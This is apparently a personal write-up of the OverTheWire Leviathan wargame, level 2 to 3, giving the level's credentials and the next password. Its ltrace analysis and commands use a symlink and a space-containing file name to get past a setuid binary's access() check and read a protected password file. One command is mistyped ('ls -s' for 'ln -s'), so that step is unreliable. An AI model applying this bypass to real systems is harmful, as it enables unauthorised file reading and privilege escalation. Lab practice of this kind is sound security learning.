Level #3 find the password for leviathan3 user

- Server: leviathan.labs.overthewire.org
- User: leviathan2
- Password: mEh5PNl10e

ssh leviathan2@leviathan.labs.overthewire.org -p 2223

//once in the home dir look at the dir contents
ls -la

//there is one executable file so try execute it
./printfile

//you will be prompted with how to use it
./printfile /etc/leviathan_pass/leviathan3

//this is not allowed, but why?
//tested and the printfile could print the files within the home directory
//read somewhere to take advantage of unintended input
//using ltrace compared the flow of function execution between a printed file and one that failed to print
ltrace ./printfile .bash_logout
ltrace ./printfile /etc/leviathan_pass/leviathan3

//comparing the function calls, for .bash_logout the access function is called and passed then in another function /bin/cat is called and prints
//for /etc/leviathan_pass/leviathan3 access function catches the lack of permisions and program is exited
//think of a way to bypass the access function since this is the only that checks you have permissions over the file passed for print

//read somewhere to test how the executable behaves for inputs separated by spaces
//after testing realized that the access function checks for permissions of the file by it's full space separated name
//but the printing function only takes the first part of the file name before the space
//so I tought having the printfile executable check the access of a file named "test file" while actually printing the contents of "test" file
//but first I needed a way for this test file that is going to be printed to be actually /etc/leviathan_pass/leviathan3
//so creating a soft link is necessary
cd /tmp
mkdir escalation
cd escalation
touch "test file"
ls -s /etc/leviathan_pass/leviathan3 test
chmod 777 .
cd ~
./printfile "test file"

leviathan3 user password: Q0G8j4sakn 
